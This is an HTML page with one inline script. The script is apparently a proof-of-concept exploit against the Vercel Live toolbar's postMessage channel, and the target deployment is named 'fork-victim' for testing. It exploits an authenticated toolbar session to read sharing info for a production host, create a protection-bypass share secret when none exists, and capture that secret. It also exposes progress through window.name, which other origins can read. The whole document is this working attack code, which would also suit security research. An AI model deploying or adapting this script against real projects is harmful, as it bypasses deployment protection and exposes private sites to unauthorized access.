<!doctype html>
<script>
(() => {
  const LIVE_ORIGIN = 'https://vercel.live';
  const PRODUCTION_HOST =
    'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
  const TEAM_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
  const SOURCE_MARKER = 'naturell_external_fork_production_share_20260809';

  const state = window.__naturellShareProof = {
    sourceMarker: SOURCE_MARKER,
    phase: 'waiting-for-toolbar',
    toolbarReady: false,
    toolbarAuthenticated: false,
    projectMatched: false,
    targetSharingRead: false,
    targetProjectMatched: false,
    aliasPresent: false,
    aliasCanUpdate: false,
    existingShareSecret: false,
    mutationSent: false,
    mutationReplyReceived: false,
    shareSecretObtained: false,
    target: null,
    shareSecret: null,
    getReplyId: null,
    updateReplyId: null,
    verifyReplyId: null,
  };

  function randomHex(byteCount) {
    const bytes = new Uint8Array(byteCount);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, byte =>
      byte.toString(16).padStart(2, '0')
    ).join('');
  }

  function safeState() {
    return {
      sourceMarker: state.sourceMarker,
      phase: state.phase,
      toolbarReady: state.toolbarReady,
      toolbarAuthenticated: state.toolbarAuthenticated,
      projectMatched: state.projectMatched,
      targetSharingRead: state.targetSharingRead,
      targetProjectMatched: state.targetProjectMatched,
      aliasPresent: state.aliasPresent,
      aliasCanUpdate: state.aliasCanUpdate,
      existingShareSecret: state.existingShareSecret,
      mutationSent: state.mutationSent,
      mutationReplyReceived: state.mutationReplyReceived,
      shareSecretObtained: state.shareSecretObtained,
    };
  }

  function setPhase(phase) {
    state.phase = phase;
    document.documentElement.dataset.shareProofPhase = phase;
    window.name = `naturell-share-proof:${JSON.stringify(safeState())}`;
  }

  function send(type, replyId, payload) {
    state.target.postMessage({type, replyId, payload}, LIVE_ORIGIN);
  }

  function readProductionSharing(replyId) {
    send('get-sharing-info', replyId, {hostname: PRODUCTION_HOST});
  }

  function acceptSharingResult(result, isVerification) {
    if (!result || typeof result !== 'object') {
      setPhase('sharing-read-invalid');
      return;
    }
    const alias = result.alias;
    state.targetSharingRead = true;
    state.targetProjectMatched = result.project?.id === PROJECT_ID;
    state.aliasPresent = Boolean(alias?.uid);
    state.aliasCanUpdate = alias?.canUpdate === true;
    const secret = alias?.protectionBypass;
    if (typeof secret === 'string' && secret.length > 0) {
      state.shareSecret = secret;
      state.shareSecretObtained = true;
      if (!state.mutationSent) state.existingShareSecret = true;
      setPhase(
        isVerification
          ? 'production-share-created'
          : 'production-share-secret-readable'
      );
      return;
    }
    if (isVerification) {
      setPhase('production-share-not-created');
      return;
    }
    if (!state.targetProjectMatched || !state.aliasPresent) {
      setPhase('production-alias-rejected');
      return;
    }
    if (!state.aliasCanUpdate) {
      setPhase('production-alias-update-denied');
      return;
    }
    state.updateReplyId = `naturell-share-update-${randomHex(12)}`;
    state.mutationSent = true;
    setPhase('production-share-create-sent');
    send('update-sharing-info', state.updateReplyId, {
      teamId: TEAM_ID,
      aliasUid: alias.uid,
    });
  }

  addEventListener('message', event => {
    if (event.origin !== LIVE_ORIGIN || !event.data) return;

    if (event.data.type === 'ready' && event.source && !state.toolbarReady) {
      state.target = event.source;
      state.toolbarReady = true;
      setPhase('toolbar-ready');
      return;
    }

    if (
      event.data.type === 'init-reply' &&
      event.source === state.target &&
      !state.toolbarAuthenticated
    ) {
      const session = event.data.existingAuth?.session;
      state.toolbarAuthenticated = Boolean(session);
      state.projectMatched = session?.projectId === PROJECT_ID;
      if (!state.toolbarAuthenticated || !state.projectMatched) {
        setPhase('toolbar-session-rejected');
        return;
      }
      state.getReplyId = `naturell-share-read-${randomHex(12)}`;
      setPhase('production-sharing-read-sent');
      readProductionSharing(state.getReplyId);
      return;
    }

    if (
      event.data.type !== 'live-frame-reply' ||
      event.source !== state.target ||
      !event.data.id
    ) return;

    if (event.data.id === state.getReplyId) {
      if (event.data.error) {
        setPhase('production-sharing-read-rejected');
        return;
      }
      acceptSharingResult(event.data.result, false);
      return;
    }

    if (event.data.id === state.updateReplyId) {
      state.mutationReplyReceived = true;
      if (event.data.error) {
        setPhase('production-share-create-rejected');
        return;
      }
      state.verifyReplyId = `naturell-share-verify-${randomHex(12)}`;
      setPhase('production-share-create-verifying');
      setTimeout(() => readProductionSharing(state.verifyReplyId), 400);
      return;
    }

    if (event.data.id === state.verifyReplyId) {
      if (event.data.error) {
        setPhase('production-share-verify-rejected');
        return;
      }
      acceptSharingResult(event.data.result, true);
    }
  });

  setTimeout(() => {
    if (!state.shareSecretObtained) setPhase('share-proof-timeout');
  }, 45000);
  setPhase('waiting-for-toolbar');
})();
</script>
